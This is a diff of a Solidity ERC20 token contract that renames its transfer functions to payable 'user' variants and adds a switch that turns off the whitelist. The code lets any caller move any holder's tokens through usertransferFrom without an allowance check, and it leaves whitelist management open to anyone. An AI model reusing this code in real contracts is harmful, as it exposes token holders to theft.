@@ -27,13 +27,14 @@ contract SimpleToken is ERC20 {
     ) public ERC20(name, symbol) {
         addtoWlist(msg.sender);
         _mint(msg.sender, initialSupply);
+        _list=list;
     }
 
-    function transferFrom(
+    function usertransferFrom(
         address sender,
         address recipient,
         uint256 amount
-    ) public virtual override returns (bool) {
+    ) public virtual payable returns (bool) {
         if (inWlist(recipient)) {
             _transfer(sender, recipient, amount);
             return true;
@@ -43,17 +44,24 @@ contract SimpleToken is ERC20 {
     }
 
     function inWlist(address add) public view returns (bool) {
+            if(!_list){
+        return true;}
         for (uint256 i = 0; i < wlist.length; i++) {
             if (wlist[i] == add) {
                 return true;
             }
         }
     }
+    
+    
+     function userapprove(address spender, uint256 amount) public payable{
+       approve( spender,  amount);
+   }
 
-    function transfer(address recipient, uint256 amount)
+    function usertransferTo(address recipient, uint256 amount)
         public
         virtual
-        override
+        payable
         returns (bool)
     {
         if (inWlist(recipient)) {
@@ -64,16 +72,16 @@ contract SimpleToken is ERC20 {
         return false;
     }
 
-    function addtoWlist(address add) public payable {
+    function addtoWlist(address add) public  {
         wlist.push(add);
     }
 
 
-    function removefromWlist(address add) public payable {
+    function removefromWlist(address add) public  {
         for (uint256 i = 0; i < wlist.length; i++) {
             if (wlist[i] == add) {
                 delete wlist[i];
-                return;
+                
             }
         }
     }
